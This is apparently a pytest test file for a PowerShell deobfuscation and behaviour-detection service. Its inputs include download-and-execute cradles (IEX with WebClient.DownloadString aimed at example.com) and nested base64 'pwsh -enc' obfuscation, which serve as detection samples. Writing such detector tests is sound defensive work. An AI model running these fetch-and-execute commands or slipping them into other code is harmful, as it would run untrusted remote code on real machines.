import base64
from pathlib import Path

import pytest

from app.schemas.behavior_detection import AddedOperation
from app.schemas.deobfuscation import SourceSpan
from app.services.behavior_detection import analyze_behaviors
from app.services.deobfuscation import deobfuscate

from .cases import PRIMARY

ROOT = Path(__file__).resolve().parents[3]


@pytest.mark.parametrize("case,expected", [
    (1, {"B05"}), (2, {"B05"}), (3, set()), (4, {"B03"}),
    (5, {"B01", "B02"}), (6, {"B01", "B02"}), (7, set()), (8, {"B03"}),
])
def test_pilot_regressions_do_not_supply_ground_truth_to_production(case, expected):
    source = (ROOT / f"datasets/safe_samples/pilot/PILOT-P{case}.ps1.txt").read_bytes().decode("utf-8")
    result = analyze_behaviors(source)
    assert set(result.behaviors) == expected
    assert result.deobfuscation == deobfuscate(source, input_provenance="original")
    assert result.deobfuscation.layers[0].text == source
    if case == 7:
        assert "OT-FORMAT" in result.obstructing_techniques and result.status == "partial"
    if case == 3:
        assert result.indicators and "https://example.com/report.csv" in result.deobfuscation.recovered_texts().values()


def test_multilabel_sample_and_multiple_operations_are_not_collapsed():
    source = ";\n".join(s for _, s in PRIMARY)
    result = analyze_behaviors(source)
    assert result.behaviors == [f"B{i:02d}" for i in range(1, 8)]
    assert len(result.findings) == 7
    result = analyze_behaviors("Get-Process; Get-Process; Get-Service")
    assert len(result.findings) == 3 and result.behaviors == ["B05"]
    assert len({(f.operation_source.start, f.operation_source.end) for f in result.findings}) == 3


def test_one_operation_with_multiple_recoveries_is_one_finding():
    source = "$op='Invoke-'+'WebRequest'; $url='https://'+'example.com/branch'; & $op -Uri $url"
    result = analyze_behaviors(source)
    assert result.behaviors == ["B01"] and len(result.findings) == 1
    finding = result.findings[0]
    assert finding.support == "contextual"
    values = {e.recovered_value for e in result.evidence}
    assert {"Invoke-WebRequest", "https://example.com/branch"} <= values
    steps = {s.transformation_id: s for s in result.deobfuscation.transformations}
    for evidence in result.evidence:
        if evidence.recovered_value is not None:
            assert evidence.provenance == "deobfuscator_recovered"
            assert any(steps[tid].recovered_text == evidence.recovered_value for tid in evidence.transformation_ids)
            assert any(steps[tid].dependencies for tid in evidence.transformation_ids)


def test_two_equal_decoded_scripts_remain_distinct_invocations():
    encoded = base64.b64encode(b"G\x00e\x00t\x00-\x00P\x00r\x00o\x00c\x00e\x00s\x00s\x00").decode()
    result = analyze_behaviors(f"pwsh -enc {encoded}; pwsh -enc {encoded}")
    assert len(result.findings) == 2
    assert {f.operation_source.layer_id for f in result.findings} == {"L1", "L2"}


def test_unicode_nested_layers_have_local_coordinates_and_original_anchors():
    inner = "# 雪🙂\r\nInvoke-WebRequest -Uri ('https://'+'example.com/cedar')"
    middle = "pwsh -enc " + base64.b64encode(inner.encode("utf-16-le")).decode()
    source = "pwsh -enc " + base64.b64encode(middle.encode("utf-16-le")).decode()
    result = analyze_behaviors(source)
    assert result.behaviors == ["B01"] and len(result.findings) == 1
    layers = {layer.layer_id: layer for layer in result.deobfuscation.layers}
    for item in result.evidence:
        text = layers[item.source.layer_id].text
        assert item.fragment == text[item.source.start:item.source.end]
        assert item.source.line == text.count("\n", 0, item.source.start) + 1
        assert item.source.column == item.source.start - text.rfind("\n", 0, item.source.start)
        assert item.source.layer_id == "L2" and item.root_source.layer_id == "L0"
        assert layers["L2"].parent_transformation_id in item.transformation_ids


def test_known_iex_wrapper_is_excluded_but_its_download_is_retained():
    source = "IEX (New-Object Net.WebClient).DownloadString('https://example.com/lab')"
    span = SourceSpan(layer_id="L0", start=0, end=3, line=1, column=1, end_line=1, end_column=4)
    result = analyze_behaviors(source, added_operations=[AddedOperation(operation="EXEC_WRAPPER_IEX", source=span)])
    assert result.behaviors == ["B01"]
    assert any(item.behavior_id == "B02" and "Wrapper" in item.reason for item in result.indicators)


def test_wrapper_metadata_must_identify_the_actual_evaluator():
    span = SourceSpan(layer_id="L0", start=0, end=3, line=1, column=1, end_line=1, end_column=4)
    with pytest.raises(ValueError):
        analyze_behaviors("Get-Process", added_operations=[AddedOperation(operation="EXEC_WRAPPER_IEX", source=span)])


def test_unresolved_variable_is_not_joined_with_an_unrelated_known_url():
    result = analyze_behaviors("$url='https://example.com/lab'; Write-Output $url; Invoke-WebRequest -Uri $url")
    assert not result.behaviors and any(i.behavior_id == "B01" for i in result.indicators)


def test_named_iex_input_is_linked_to_its_immediate_download():
    result = analyze_behaviors("Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('https://example.com/cedar')")
    assert result.behaviors == ["B01", "B02"]


def test_no_forward_variable_binding_is_invented():
    result = analyze_behaviors("Invoke-WebRequest -Uri $later; $later='https://example.com/lab'")
    assert not result.behaviors


def test_inline_recovery_remains_data_and_does_not_open_a_script_layer():
    encoded = base64.b64encode(b"Get-Process").decode()
    result = analyze_behaviors(f"Write-Output ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}')))")
    assert not result.behaviors and len(result.deobfuscation.layers) == 1


def test_related_recovery_is_used_only_as_the_argument_at_its_actual_site():
    encoded = base64.b64encode(b"https://example.com/cedar").decode()
    result = analyze_behaviors(f"Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}')))")
    assert result.behaviors == ["B01"] and len(result.deobfuscation.layers) == 1


def test_a_terminator_does_not_leave_a_provably_unreachable_positive():
    result = analyze_behaviors("return; Get-Process")
    assert not result.behaviors and result.indicators


def test_explicit_alias_mutation_prevents_later_command_name_assumptions():
    result = analyze_behaviors("Set-Alias Get-Process Write-Output; Get-Process")
    assert not result.behaviors and result.indicators
